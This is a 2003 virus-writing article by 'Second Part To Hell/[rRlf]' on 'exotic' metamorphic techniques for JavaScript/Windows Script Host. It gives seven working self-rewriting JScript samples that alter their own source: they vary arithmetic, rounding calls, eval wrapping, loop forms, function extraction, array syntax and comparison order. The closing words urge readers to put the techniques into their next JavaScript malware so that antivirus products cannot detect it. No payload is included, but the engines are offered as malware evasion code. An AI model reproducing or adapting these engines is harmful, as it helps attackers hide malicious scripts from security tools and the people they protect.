@@ -1,0 +1,684 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************      Exotic Morphing Techniques      ***********
+	  ************            In JavaScript             ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+.intro words
+
+  This article deals with exotic morphing techniques. The following techniques are
+  all kinds of Polymorphism, but not the standart way, moreover some neverseen ones.
+  After I wrote something about Encryption, EPO, standart-Polymorphism and so on in
+  JavaScript, I decided do make something neverseen and neverthought. And, in my
+  oppinion, I had success. That was my inspiration: I've never seen something
+  NON-STANDART in JavaScript. Sure, there are some good things in that language,
+  for instands the poly engines by jackie, but that's more or less standart (anyway,
+  it's real good quality). I don't know, if the following are as good as the 'standart'
+  techniques, anyway, they are new, and maybe interessting. When I started to get the
+  ideas and begin to write the samples, I asked Kefi and SAD1c, if they want to do the
+  project together with me, but unfortunatly they had no real ideas for this topic, so
+  I had to do it alone. Now go and read something more senseful that this silly intro :).
+
+
+
+
+
+
+.index
+
+  1) Morphing techniques
+       a) Calculations with one variable
+       b) Round Numbers
+       c) eval()
+       d) for | while | do ... while
+       e) function games
+       f) Array stuff
+       g) If changing
+
+
+
+
+
+
+
+.Morphing techniques
+
+  The most diffiult thing when I did this project was to find things, which I could change.
+  I had some ideas, when I started, but not enought for a cool project, so I went to a
+  bookstore and bought a nice 'JavaScript-Reference-Guide'. Then the most difficult thing:
+  I had to search different commands with the same result or even commands, which could be
+  changed. And slowly some ideas reached my brain. :) And, you may think, making the sample
+  for a technique is difficulter than get an idea, but that's not right, as I found out.
+  As you can see, I found seven different techniques, how I can change a code in an exotic
+  way. Some of them are really useful and some of them are just sick. Now read and try to
+  understand...
+
+
+
+
+
+  a) Calculations with one variable
+
+     As you know, you can use different calculations to get the same result. Therefore
+     I also thought about that, and I think, that I had success. First have a look at
+     the different commands, than look at the example.
+
+     * Add
+       - i=i+3;
+       - i+=3;
+       - i++; i++; i++;
+
+     * Sub
+       - i=i-3;
+       - i-=3;
+       - i--; i--; i--;
+
+     * Mul
+       - i=i*3;
+       - i*=3;
+       - i/=(1/3);
+
+     * Div
+       - i=i/3;
+       - i/=3;
+       - i*=(1/3);
+
+    Now you can see, that we have 3 different commands for every calculation. But now we have
+    to exchange them, and that's more difficult. The most difficult thing while writing a tool,
+    which changes the calculation is, that the variable-name and the numbers will be different.
+    Therefore I used only variables which have the following form: [nuc????].
+
+ - - - - - - - - - - - - - - - [ Calculation example ] - - - - - - - - - - - - - - -
+/*
+nucaaaa=nucaaaa+3;
+nucaaaa+=3;
+nucaaaa++; nucaaaa++;
+
+nucaaaa=nucaaaa-5;
+nucaaaa-=5;
+nucaaaa--; nucaaaa--;
+
+nucaaaa=nucaaaa*4;
+nucaaaa*=4;
+nucaaaa/=(1/4);
+
+nucaaaa=nucaaaa/7;
+nucaaaa/=7;
+nucaaaa*=(1/7);
+*/
+var fso=WScript.CreateObject('Scripting.FileSystemObject');
+fileall=fso.OpenTextFile(WScript.ScriptFullName).ReadAll()
+filelns=fileall.split(String.fromCharCode(13,10)); code='';
+for (nuccali=0; nuccali<filelns.length;) 
+{
+  code+=String.fromCharCode(13,10);
+  for (nuccalj=0; nuccalj<filelns[nuccali].length;)
+  {
+    check=0;
+    if (filelns[nuccali].substring(nuccalj,nuccalj+3)=='nuc')
+    {
+      sign=filelns[nuccali].substring(nuccalj,nuccalj+7);
+      for (nuccalk=0; nuccalk<20;)
+      {
+        nuccalk+='';
+        if (filelns[nuccali].substring(nuccalj,nuccalj+17+nuccalk.length)==sign+'='+sign+'+'+nuccalk+';') { numfound('+',sign,nuccalk); nuccalj+=17+nuccalk.length; }
+        if (filelns[nuccali].substring(nuccalj,nuccalj+10+nuccalk.length)==sign+'+='+nuccalk+';') { numfound('+',sign,nuccalk); check=1; nuccalj+=10+nuccalk.length; }
+        if (filelns[nuccali].substring(nuccalj,nuccalj+17+nuccalk.length)==sign+'='+sign+'-'+nuccalk+';') { numfound('-',sign,nuccalk); nuccalj+=17+nuccalk.length; }
+        if (filelns[nuccali].substring(nuccalj,nuccalj+10+nuccalk.length)==sign+'-='+nuccalk+';') { numfound('-',sign,nuccalk); nuccalj+=10+nuccalk.length; }
+        if (filelns[nuccali].substring(nuccalj,nuccalj+17+nuccalk.length)==sign+'='+sign+'*'+nuccalk+';') { numfound('*',sign,nuccalk); nuccalj+=17+nuccalk.length; }
+        if (filelns[nuccali].substring(nuccalj,nuccalj+10+nuccalk.length)==sign+'*='+nuccalk+';') { numfound('*',sign,nuccalk); nuccalj+=10+nuccalk.length; }
+        if (filelns[nuccali].substring(nuccalj,nuccalj+14+nuccalk.length)==sign+'/=(1/'+nuccalk+');') { numfound('*',sign,nuccalk); nuccalj+=14+nuccalk.length; }
+        if (filelns[nuccali].substring(nuccalj,nuccalj+17+nuccalk.length)==sign+'='+sign+'/'+nuccalk+';') { numfound('/',sign,nuccalk); nuccalj+=17+nuccalk.length; }
+        if (filelns[nuccali].substring(nuccalj,nuccalj+10+nuccalk.length)==sign+'/='+nuccalk+';') { numfound('/',sign,nuccalk); nuccalj+=10+nuccalk.length; }
+        if (filelns[nuccali].substring(nuccalj,nuccalj+14+nuccalk.length)==sign+'*=(1/'+nuccalk+');') { numfound('/',sign,nuccalk); nuccalj+=14+nuccalk.length; }
+        nuccalk/=1;
+        nuccalk=nuccalk+1;
+      }
+      if (filelns[nuccali].substring(nuccalj,nuccalj+10)==sign+'++;') { numfound('+',sign,1); nuccalj+=10; }
+      if (filelns[nuccali].substring(nuccalj,nuccalj+10)==sign+'--;') { numfound('-',sign,1); nuccalj+=10; }
+    }
+   nuccalj++;
+   if (!check) { code+=filelns[nuccali].charAt(nuccalj-1) }
+  }
+nuccali++;
+}
+file=fso.OpenTextFile(WScript.ScriptFullName,2)
+file.Write(code)
+file.Close();
+
+function numfound(calc, sign, number)
+{
+  switch(calc)
+  {
+  case '+':
+    rand=Math.round(Math.random()*2)
+    switch(rand)
+    {
+    case 0: code+=sign+'='+sign+'+'+number+';'; break;
+    case 1: code+=sign+'+='+number+';'; break;
+    case 2: for (nuccall=0; nuccall<number;) { nuccall++; code+=sign+'++;'; }; break;
+    }
+    break;
+  case '-':
+    rand=Math.round(Math.random()*2)
+    switch(rand)
+    {
+    case 0: code+=sign+'='+sign+'-'+number+';'; break;
+    case 1: code+=sign+'-='+number+';'; break;
+    case 2: for (nuccall=0; nuccall<number;) { nuccall++; code+=sign+'--;'; }; break;
+    }
+    break;
+  case '*':
+    rand=Math.round(Math.random()*2)
+    switch(rand)
+    {
+    case 0: code+=sign+'='+sign+'*'+number+';'; break;
+    case 1: code+=sign+'*='+number+';'; break;
+    case 2: code+=sign+'/=(1/'+number+');'; break;
+    }
+    break;
+  case '/':
+    rand=Math.round(Math.random()*2)
+    switch(rand)
+    {
+    case 0: code+=sign+'='+sign+'/'+number+';'; break;
+    case 1: code+=sign+'/='+number+';'; break;
+    case 2: code+=sign+'*=(1/'+number+');'; break;
+    }
+    break;
+  }
+}
+ - - - - - - - - - - - - - - - [ Calculation example ] - - - - - - - - - - - - - - -
+
+     As you can see, the first lines are just commands to check, if it works, because it's
+     hell to look to the code and try to find things which changed. And because of the reason
+     that this is no beginner tutorial I won't explain every line, but I'll tell you, how it
+     works.
+     --> It splits the whole code into lines (chr[13+10])
+
+     --> It searchs in the line, if it find the beginn of a variable, which is the first thing
+         for every calculation (this startcode is 'nuc')
+
+     --> It checks 12 ways, if there is a calculation to change.
+
+     --> It calls the function 'numfound', and save the calculationtyp (+,-,*,/), the variablename,
+         and the number (it finds it's number in a brute-force way, and because of the time to run
+         it only searchs numbers from 0-20:
+         ( 100lines * 40letters per line * 12 calculation ways * 20 numbers)
+
+     --> It searchs a new calculation and add it to the code
+
+
+
+
+
+
+
+
+  b) Round Numbers
+
+     Most JavaScript viruses use the command 'Math.round(Math.random()*?)' to find random numbers.
+     Now look at the command 'round'. You can change this.
+
+     - Math.round(Math.random()*9)+1 | Numbers: 1-10
+     - Math.floor(Math.random()*9)+1 | Numbers: 1-9
+     - Math.ceil(Math.rondom()*9)+1  | Numbers: 2-10
+
+     You can see, that there is a different beween the numbers, but it's not a big
+     problem, because you're searching random numbers, so you can easyly use this.
+
+
+ - - - - - - - - - - - - - - - [ Round-numbers example ] - - - - - - - - - - - - - - -
+/*
+round
+floor
+ceil
+round
+floor
+ceil
+round
+floor
+ceil
+round
+floor
+ceil
+*/
+var fso=WScript.CreateObject('Scripting.FileSystemObject');
+fileall=fso.OpenTextFile(WScript.ScriptFullName).ReadAll()
+var rname=new Array('r'+'ound', 'f'+'loor', 'c'+'eil');
+for (i=0; i<3; i++)
+{
+  code='';
+  for (j=0; j<fileall.length; j++)
+  {
+    if (fileall.substring(j,j+rname[i].length)==rname[i]) { found(); j+=rname[i].length; }
+    code+=fileall.charAt(j);
+  }
+  fileall=code;
+}
+file=fso.OpenTextFile(WScript.ScriptFullName,2).Write(code)
+
+function found()
+{
+  switch(Math.round(Math.random()*4))
+  {
+    case 1: code+='r'+'ound'; break;
+    case 2: code+='f'+'loor'; break;
+    case 3: code+='c'+'eil'; break;
+    default: found(); break;
+  }
+}
+ - - - - - - - - - - - - - - - [ Round-numbers example ] - - - - - - - - - - - - - - -
+
+     You can see again, that the first lines between the '/*-*/' are commands to check,
+     if it works. In my opinion, this code works good, also there are only three different
+     commands to change. Nevertheless, this is a really shourt and complex script. Now
+     I'll explain you, how it works.
+
+     --> Makes array with the three things, which will be changed (round, floor, ceil).
+
+     --> Checks if the code contains the things.
+
+     --> If yes, change it in the code, and write it back to file.
+
+
+
+
+
+
+
+  c) eval()
+
+     This is a really nice command, which runs strings. And because of that we have three
+     new ways to change our code. First have a look at the syntax:
+     eval('...code...')
+     I'll explain you, how you are able to do same things in a different way:
+
+     - code
+     - eval('code');
+     - var a='code'; eval(a);
+
+     One little thing, that you have to note: You don't want, that sometime your whole code
+     contains 'eval()'s, so you have to replace them sometimes. A problem could be, that your
+     string is a variable, so if you replace the 'eval', the variable will be alone in the
+     code, therefore a syntax-error occure. So you also have to replace the variable and write
+     the orginal string to the code.
+
+ - - - - - - - - - - - - - - - [ eval() example ] - - - - - - - - - - - - - - -
+// Any silly command 1
+// Any silly command 2
+// Any silly command 3
+// Any silly command 4
+// Any silly command 5
+
+var fso=WScript.CreateObject('Scripting.FileSystemObject');
+code=''; checkb=0;
+filesp=fso.OpenTextFile(WScript.ScriptFullName).ReadAll().split(String.fromCharCode(13,10))
+for (i=0; i<filesp.length; i++) {
+for (j=0; j<filesp[i].length; j++) { if (filesp[i].substring(j,j+5)=='e'+'val(') { foundev(); checkb=1; } }
+switch(Math.round(Math.random()*3)) {
+case 1: if (!checkb) { makeev(); } break;
+default: code+=filesp[i]+String.fromCharCode(13,10); break; } }
+WScript.Echo(code)
+
+function foundev() {
+if (Math.round(Math.random()*3)==1) {
+switch(j) {
+case 0: code+=filesp[i].substring(7,filesp[i].length-2)+String.fromCharCode(13,10); break;
+default: for (k=0; k<filesp[i].length; k++) { if (filesp[i].substring(k,k+2)==';'+' ') { code+=filesp[i].substring(10,k-1)+String.fromCharCode(13,10) } }; break; } } }
+
+function makeev() {
+check=0; ranname=randn();
+for (j=0; j<filesp[i].length; j++) { if (filesp[i].charAt(j)==String.fromCharCode(58)) { check=1 } }
+if (filesp[i].charAt(5)!=String.fromCharCode(34) && !check && filesp[i].charAt(filesp[i].length-1)!=String.fromCharCode(123)) {
+switch(Math.round(Math.random()*1)) {
+case 0: code+='var '+ranname+'='+String.fromCharCode(34)+filesp[i]+String.fromCharCode(34)+'; eval('+ranname+')'+String.fromCharCode(13,10)
+case 1: code+='eval('+String.fromCharCode(34)+filesp[i]+String.fromCharCode(34)+');'+String.fromCharCode(13,10) } } }
+
+function randn() {
+randon='';
+for (j=0; j<4; j++) { randon+=String.fromCharCode(Math.round(Math.random()*25)+98) }
+return(randon) }
+ - - - - - - - - - - - - - - - [ eval() example ] - - - - - - - - - - - - - - -
+
+     First: the first 5 command do nothing. It's just for checking, what the code does.
+     This is a hardcore complex code, I think, and it's little hard to understand,
+     but I just want to show you, that it's possible, and not help you ripping my
+     programs :). Now let's have a look at the behaviour of the script.
+
+     --> It splits the code to lines [chr(13+10)]
+
+     --> It searchs for 'eval(', and one in three, it removes the eval (and, if it exists,
+        the variable, which contains the code)
+
+     --> It checks if the a line can be changed: 
+         * 5th sign<>" (already changed without a variable = error occures because of double "'s)
+         * doesn't contain a ':' ( case = syntax error occures)
+         * last sign<>'{' ( for instands: function ...() | if () | for () = syntax error occures)
+
+     --> One in three, the line becomes changed.
+
+
+
+
+
+
+
+  d) for | while | do ... while
+
+     This is the next technique, how to change your code. If you want to run something
+     x times, you need one of this commands. The syntax of them are little different, but
+     all in all, we are able to change the things. Now let's look at the lines with different
+     commands, which anyway does the same:
+
+     - for (i=0; i<5; i++) { WScript.Echo(i); }
+     - i=0; while (i<5) { WScript.Echo(i); i++; }
+     - i=0; do { WScript.Echo(i); i++; } while (i<5);
+
+     OK, what do we need to change them?
+     --> the variablename ('i')
+     --> the start-value ('0')
+     --> when we want to end the loop ('<5')
+     --> the calculation ('++')
+     --> the commands ('WScript.Echo(i);')
+
+     If we found that, it should be easy to change the code. But you have to know, that you have
+     search the things three times, because there are 3 different sytaxes.
+     A big problem to find the commands could be a line like that:
+       -  -  -  -  -
+     for (i=0; i<12; i++) { for (j=0; j<3; j++) { WScript.Echo(i+j); if (j==i) { WScript.Echo(j); } } }
+       -  -  -  -  -
+     Do you know why? Because there are 2 'for' in one line and there is also an 'if'. That means, that
+     we can't search for the commands, but we count and search the '}'. But just look at my example.
+
+
+ - - - - - - - - - - - - - - - [ for|(do ... ) while example ] - - - - - - - - - - - - - - -
+/*
+for (i=0; i<12; i++) { WScript.Echo(i) }
+for (i=100; i<filesp[i].length; i=i+100) { WScript.Echo(i) }
+for (i=1000; i>0; i--) { WScript.Echo(i) }
+*/
+var fso=WScript.CreateObject('Scripting.FileSystemObject'); code=''
+filesp=fso.OpenTextFile(WScript.ScriptFullName).ReadAll().split(String.fromCharCode(13,10))
+i=0; do { check=0; j=0; while (j<filesp[i].length) { if (filesp[i].substring(j,j+3)=='f'+'or') { foundit('f'); check=1; } if (!check) { code+=filesp[i].charAt(j); } j++; } code+=String.fromCharCode(13,10); i++ } while (i<filesp.length);
+fso.OpenTextFile(WScript.ScriptFullName,2).Write(code)
+function foundit(typea)
+{
+  switch(typea)
+  {
+    case 'f':
+      address=j+5;
+      k=address; while (k<address+20) { if (filesp[i].charAt(k)=='=') { useita=filesp[i].substring(address,k); k=address+20; } k++; }
+      address+=2*useita.length;
+      k=address; do { if (filesp[i].substring(k,k+2)=='; ') { useitb=filesp[i].substring(address,k); k=address+100; } k++ } while (k<address+100);
+      address+=2+useita.length+useitb.length;
+      k=address; while (k<address+100) { if (filesp[i].substring(k,k+2)=='; ') { useitc=filesp[i].substring(address,k); k=address+100; }  k++; }
+      address+=2+useita.length+useitc.length;
+      k=address; while (k<address+30) { if (filesp[i].substring(k,k+2)==') ') { useitd=filesp[i].substring(address,k); k=address+30; } k++; }
+      changeit(useita, useitb, useitc, useitd, 1, address+2+useitd.length)
+      break;
+  }
+}
+
+function changeit(ca, cb, cc, cd, count, addy)
+{
+  k=0; while (k<j) { if (filesp[i].charAt(k)==String.fromCharCode(123)) { count++; }; if (filesp[i].charAt(k)==String.fromCharCode(125)) { count--; } k++; }
+  k=filesp[i].length; while (k>0) { if (filesp[i].charAt(k)==String.fromCharCode(123)) { count++; }; if (filesp[i].charAt(k)==String.fromCharCode(125)) { count--; }; if (!count) { cea=k; k=0; }  k--; }
+  ce=filesp[i].substring(addy,cea); j=cea+1; 
+  switch(Math.round(Math.random()*2))
+  {
+    case 0: code+='f'+'or ('+ca+'='+cb+'; '+ca+cc+'; '+ca+cd+') '+ce+' }'; break;
+    case 1: code+=ca+'='+cb+'; while ('+ca+cc+') '+ce+ca+cd+'; }'; break;
+    case 2: code+=ca+'='+cb+'; do '+ce+ca+cd+' } while ('+ca+cc+');'; break;
+  }
+    code+=filesp[i].substring(j,filesp[i].length);
+}
+ - - - - - - - - - - - - - - - [ for|(do ... ) while example ] - - - - - - - - - - - - - - -
+
+      This code changes every 'for' to 'for' | 'while' | 'do ... while'. It should be no problem
+      to also change the 'while' and 'do-while', but as I've already told you before, I don't want
+      to help you to ripp anything :). The code just exists because I want to give you the idea how
+      to make something like that. OK, now let's look at the short explanation, how it works.
+
+      --> splits the whole code to lines
+
+      --> search for a 'for' (exactly it searchs for 'f'+'or', because we don't want to give another
+          'for' to find).
+
+      --> It searchs for the variable (for instands 'i')
+
+      --> It searchs for the value (for instands '0' [i=0])
+
+      --> It searchs for the behavior (for instands '<10')
+
+      --> It searchs for the calculation (for instands '++')
+
+      --> It makes a new loop with the founden values
+
+      --> It writes the new code to the file
+
+
+
+
+
+
+
+  e) function games
+
+     First question: What exactly does a function? It contains a code, which it runs.
+     And now another question: What (for instands) does a for? It runs a code x times.
+     Guess what that means... We can change the 'for' (or 'if' or whatever) to call a
+     function, which contains our code. That was my idea, and when I tried to make it,
+     it was no problem. But first let's look at the possible variants:
+
+     - for (i=0; i<100; i++) { WScript.Echo(i) }
+     - for (i=0; i<100; i++) { anyname() }
+       function anyname { WScript.Echo(i) }
+
+     - if (...) { code }
+     - if (...) { anyfunction() }
+       function anyfunction() { code }
+
+     I think, you got the point. You just have to search for a '{' and copy the code.
+     Then you make a new function with the code, delete the code in the file, and call
+     the function. Easy, ehh? :) Have a look at the example:
+
+ - - - - - - - - - - - - - - - [ function games example ] - - - - - - - - - - - - - - -
+var fso=WScript.CreateObject('Scripting.FileSystemObject');
+nl=String.fromCharCode(13,10); code=''; count=0; fcode=''
+file=fso.OpenTextFile(WScript.ScriptFullName).ReadAll()
+for (i=0; i<file.length; i++) { check=0; if (file.charAt(i)==String.fromCharCode(123) && Math.round(Math.random()*3)==1) { foundit(); check=1 } if (!check) { code+=file.charAt(i) } }
+fso.OpenTextFile(WScript.ScriptFullName,2).Write(code+fcode)
+
+function foundit()
+{
+  fcodea=''; count=0; randon='';
+  for (j=i; j<file.length; j++) { if (file.charAt(j)==String.fromCharCode(123)) { count++; } if (file.charAt(j)==String.fromCharCode(125)) { count--; } if (!count) { fcodea=file.substring(i+1,j); j=file.length; } }
+  for (j=0; j<Math.round(Math.random()*5)+4; j++) { randon+=String.fromCharCode(Math.round(Math.random()*25)+97) }
+  fcode+=nl+nl+'function '+randon+'()'+nl+String.fromCharCode(123)+nl+fcodea+nl+String.fromCharCode(125)
+  code+=String.fromCharCode(123)+' '+randon+'() '
+  i+=fcodea.length;
+}
+ - - - - - - - - - - - - - - - [ function games example ] - - - - - - - - - - - - - - -
+
+      The code is pretty easy and shout, anyway: I'll explain, how it works:
+
+      --> Read the code from the file
+
+      --> Searchs for a '{'
+
+      --> Searchs for the end of the function|for|if|whatever
+
+      --> One in three it makes a new function with the code, and makes a call to the funtion
+
+
+
+
+
+
+
+  f) Array stuff
+
+     An 'Array' is a variable, where you can save more than one value. That command is really
+     important for virus writer :). But, as you might think, we can also change the command,
+     that it look really different as before. How to do this? It's possible to give the array
+     the values directly when you make the array, or you can also give it a value after make
+     it. Now let's look at the two different instructions:
+
+     - var a=new Array('a', 'b', 'c');
+     - var a=new Array(); a[0]='a'; a[1]='b'; a[2]='c';
+
+     OK, how does that work? You run the line with the array, save the values and make a new
+     line with the changed command. Should be easy. Let's have a look at the 'array'-example:
+
+
+ - - - - - - - - - - - - - - - - - - [ Array example ] - - - - - - - - - - - - - - - - - -
+/*
+var testa=new Array('a', 'b', 'c', 'Iris')
+var testb=new Array(); testb[0]='a'; testb[1]='b'; testb[2]='c'; testb[3]='Iris';
+*/
+
+var fso=WScript.CreateObject('Scripting.FileSystemObject'); code='';
+filesp=fso.OpenTextFile(WScript.ScriptFullName).ReadAll().split(String.fromCharCode(13,10))
+for (i=0; i<filesp.length; i++) { for (j=0; j<filesp[i].length; j++) { if (filesp[i].substring(j,j+10)=='n'+'ew Array(') { arrayf() } if (filesp[i].substring(j,j+10)!='n'+'ew Array(') { code+=filesp[i].charAt(j,j+1) } } code+=String.fromCharCode(13,10) }
+WScript.Echo(code)
+
+function arrayf()
+{
+  arrvar=filesp[i].substring(4,j-1)
+  code=code.substring(0,code.length-5-arrvar.length)
+  rand=Math.round(Math.random()*1)
+  eval(filesp[i])
+  code+='var '+arrvar+'=n'+'ew Array('
+  if (!rand)
+  {
+    for (k=0; k<eval(arrvar).length; k++) { code+=String.fromCharCode(39)+eval(arrvar)[k]+String.fromCharCode(39,59,32) }
+    code=code.substring(0,code.length-2)+String.fromCharCode(41)
+  }
+  if (rand)
+  {
+    code+='); ';
+    for (k=0; k<eval(arrvar).length; k++) { code+=arrvar+'['+k+']='+String.fromCharCode(39)+eval(arrvar)[k]+String.fromCharCode(39,59,32) }
+  }
+  j=filesp[i].length;
+}
+ - - - - - - - - - - - - - - - - - - [ Array example ] - - - - - - - - - - - - - - - - - -
+
+     Now I'll explain exactly how the code works, I hope, you will understand it :)
+
+     --> Splits the code into lines.
+
+     --> Searchs a string named 'new Array('.
+
+     --> Evals the array, to get the values.
+
+     --> Makes the new Array.
+
+
+
+
+
+
+
+  g) If changing
+
+     'If' is one of the most important commands in every progging-language, but you know that.
+     But maybe you don't know, that you can also change the structur of the 'if'. Just think 
+     about that: 'a<=b' == 'b>=a'. That was my basic, and so I made the code, which changes
+     the 'if' in the code. You have to know, that the code only changes the 'double-sign'-operator
+     due I was too lazy, to also change the '<','>','===','!=='. Anyway, the idea is discovered,
+     and also the praxis is done. But now let's have a look at the things, the program changes:
+
+     - if (a<=b) { ... }	<-->	if (b>=a) { ... }
+     - if (a>=b) { ... }	<-->	if (b<=a) { ... }
+     - if (a!=b) { ... }	<-->	if (b!=a) { ... }
+     - if (a==b) { ... }	<-->	if (b==a) { ... }
+
+     A funny thing is, that the code also changes some ' '. I don't really know why, but I guess,
+     it's no problem, due this is a 'JavaScript-Code changing'-article. But now let's look at the
+     example of the technique:
+    
+ - - - - - - - - - - - - - - - - - - [ If-changing example ] - - - - - - - - - - - - - - - - - -
+// if (a<=b) { ... }	| if (b>=a) { ... }
+// if (a>=b) { ... }	| if (b<=a) { ... }
+// if (a!=b) { ... }	| if (b!=a) { ... }
+// if (a==b) { ... }	| if (b==a) { ... }
+
+var fso=WScript.CreateObject('Scripting.FileSystemObject'); code='';
+filesp=fso.OpenTextFile(WScript.ScriptFullName).ReadAll().split(String.fromCharCode(13,10))
+for (i=0; i<filesp.length; i++)
+{
+  for (j=0; j<filesp[i].length; j++)
+  {
+    if (filesp[i].substring(j,j+4)=='i'+'f '+String.fromCharCode(40)) { foundit() }
+    if (filesp[i].substring(j,j+4)!='i'+'f '+String.fromCharCode(40)) { code+=filesp[i].charAt(j) }
+  }
+  code+=String.fromCharCode(13,10)
+}
+fso.OpenTextFile(WScript.ScriptFullName,2).Write(code)
+WScript.Echo(code)
+
+function foundit()
+{
+  count=1;
+  for (k=j; k<filesp[i].length; k++) 
+  {
+    switch(filesp[i].substring(k,k+2))
+    {
+      case '<=': sign='>='; vara=filesp[i].substring(j+4,k); k=filesp[i].length; break;
+      case '>=': sign='<='; vara=filesp[i].substring(j+4,k); k=filesp[i].length; break;
+      case '!=': sign='!='; vara=filesp[i].substring(j+4,k); k=filesp[i].length; break;
+      case '==': sign='=='; vara=filesp[i].substring(j+4,k); k=filesp[i].length; break;
+      default: sign=''; break;
+    }
+  }
+  for (l=j+vara.length+6; l<filesp[i].length; l++) { if (filesp[i].charAt(l)==String.fromCharCode(40)) { count++ } if (filesp[i].charAt(l)==String.fromCharCode(41)) { count--; } if (count==0) { varb=filesp[i].substring(j+vara.length+6,l); l=filesp[i].length; } }
+  j--;
+  if (Math.round(Math.random()*2)==1) { code+='i'+'f ('+varb+sign+vara+')'; j+=vara.length+varb.length+8; }
+}
+ - - - - - - - - - - - - - - - - - - [ If changing example ] - - - - - - - - - - - - - - - - - -
+
+     This code should be quite easy, and not really hard to understand for you. Anyway, I'll
+     tell you, what it does:
+
+     --> Splits the code to lines
+
+     --> searchs for 'if (' in the lines
+
+     --> Finds the first operator
+
+     --> Finds the calculation and get the new one
+
+     --> Finds the second operator
+
+     --> chages the 'if'
+
+
+
+
+
+
+
+.last words
+
+  In the end I want to tell you, that I've really enjoyed discovering the techniques and writing the
+  article. All in all, I hope, that you learned something by reading this thing, and maybe you will
+  try to use some things in you're next JavaScript-maleware. :) I'm sure, that AntiVirus-guys would
+  have a real big problem, if they have to detect such a virus with some exotic morphing techniques.
+  And isn't it our mission to fake these guys? ;) OK, now go on and work on something useful, maybe
+  with the new information I gave you. It would be great, if I'll get some mails about what you think
+  about this techniques, no problme if a good critic or a bad one... :D
+
+
+							- - - - - - - - - - - - - - -
+							  Second Part To Hell/[rRlf]  
+							  www.spth.de.vu
+							  spth@aonmail.at
+							  written from august-oct 2003
+							  Austria
+							- - - - - - - - - - - - - - - 
